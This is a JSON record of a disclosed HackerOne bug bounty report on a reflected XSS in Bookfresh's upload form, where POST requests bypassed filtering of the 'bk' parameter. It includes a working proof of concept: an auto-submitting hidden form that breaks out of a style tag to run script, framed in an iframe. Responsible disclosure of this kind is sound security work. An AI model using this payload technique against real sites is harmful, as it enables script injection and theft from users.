{
  "id": 31187,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTE4Nw==",
  "url": "https://hackerone.com/reports/31187",
  "title": "Reflected XSS on www.bookfresh.com/index.html?view=upload_form",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2014-10-13T01:52:44.576Z",
  "submitted_at": "2014-10-13T01:52:44.576Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "stefanovettorazzi",
    "url": "/stefanovettorazzi",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/2udi3vbdhzbpwjlrvhxisg1q29dk/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 432,
    "url": "https://hackerone.com/bookfresh",
    "handle": "bookfresh",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/432/2faea4478de17a1a299dced58b4e96235cc492f0_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/432/2faea4478de17a1a299dced58b4e96235cc492f0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Bookfresh",
      "twitter_handle": "",
      "website": "https://www.bookfresh.com/",
      "about": "Let your customers book and pay online from any device, 24/7. While youâ€™re busy with your customers, BookFresh is busy filling up your schedule."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-08-31T10:31:55.025Z",
  "bug_reporter_agreed_on_going_public_at": "2017-08-01T10:31:45.998Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The issue is in the view _upload_form_.\r\n\r\n**Description**\r\nWhen you show an upload form in the site you use an URL like this: https://www.bookfresh.com/index.html?standalone=1&e=0c551a759eb62ba457d017569617eaa8&bk=FFFFFF&view=upload_form\r\nAnd you show the value of the parameter `bk` in the page: `<style>body{ background-color: #[VALUE_OF_BK]; }</style>`. \r\n\r\nYou have protection for XSS because you encode or remove tags like `<script>`, etc.\r\nBut the problem is that you are only protecting the `GET` requests. So, if I do a `POST` request the value of `bk` is shown in the page without encoding or removing the tags.\r\n\r\nAnother problem is that when the file https://www.bookfresh.com/index.html is loaded from the server there is not `X-Frame-Options` header set in the response. So, it will be more easy to exploit the vulnerability.\r\n\r\n**Steps to reproduce**:\r\n1. Create a HTML file with this content:\r\n\r\n        <form action=\"https://www.bookfresh.com/index.html\" method=\"post\">\r\n         <input type=\"hidden\" name=\"bk\" value=\"</style><script>alert(document.domain);</script><style>\">\r\n         <input type=\"hidden\" name=\"view\" value=\"upload_form\">\r\n        </form>\r\n        <script>\r\n         document.forms[0].submit();\r\n        </script>\r\n\r\n2. Create a HTML file with this content:\r\n\r\n        <iframe src=\"[path_of_the_file_from_step_1]\"></iframe>\r\n\r\n3. Put the files on a server or run a test server on the localhost with something like: `php -S localhost:8000`\r\n4. Visit the file created in the step 2 and wait a few seconds.\r\n5. You will see an `alert()` with the domain of the frame: www.bookfresh.com.\r\n\r\nIt works on the last version of Firefox and it doesn't work on the last version of Chrome.",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-08-31T10:31:46.066Z",
  "allow_singular_disclosure_after": -203648450.72266275,
  "singular_disclosure_allowed": true,
  "vote_count": 5,
  "voters": [
    "r3y",
    "eveeez",
    "sumit7",
    "hacklad",
    "shivammusic"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
